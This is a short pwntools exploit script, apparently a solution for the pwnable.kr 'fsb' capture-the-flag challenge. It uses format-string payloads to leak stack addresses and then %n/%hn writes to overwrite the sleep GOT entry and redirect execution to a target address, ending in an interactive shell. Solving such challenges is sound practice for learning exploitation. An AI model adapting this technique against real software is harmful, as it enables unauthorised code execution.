from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnablekr_fsb")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./pwnablekr_fsb")
else:
	pass

def debugf():
	gdb.attach(p,"b *0x08048610")

#context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
key_addr = 0x0804A060
target_addr = 0x080486AB
sleep_got = elf.got["sleep"]
# leak stack
ebp_main_offset = 0x13 - 1
ebp_offset = 0xf - 1
target_offset1 = 0xe
target_offset2 = 0x14
payload = "%{offset1}$p %{offset2}$p".format(offset1 = ebp_offset,offset2 = ebp_main_offset)
p.sendafter("\n",payload)
info = p.recvuntil("Give",drop = True)
buf_addr = int(info.split(" ")[0],16) - 0x50
ebp_main_addr = int(info.split(" ")[1],16)
log.success("buf_addr:"+hex(buf_addr))
log.success("ebp_main_addr:"+hex(ebp_main_addr))
# write sleep got in main_ebp
offset = (ebp_main_addr - buf_addr) / 4
payload = "%{num1}c%{offset}$n".format(num1 = sleep_got,offset = ebp_main_offset)
p.sendafter("\n",payload)
# write target
payload = "%{num1}c%{offset}$hn".format(num1 = target_addr&0xffff,offset = offset)
p.sendafter("\n",payload.ljust(0x64,"a"))
p.send("A"*0x30)
p.interactive()
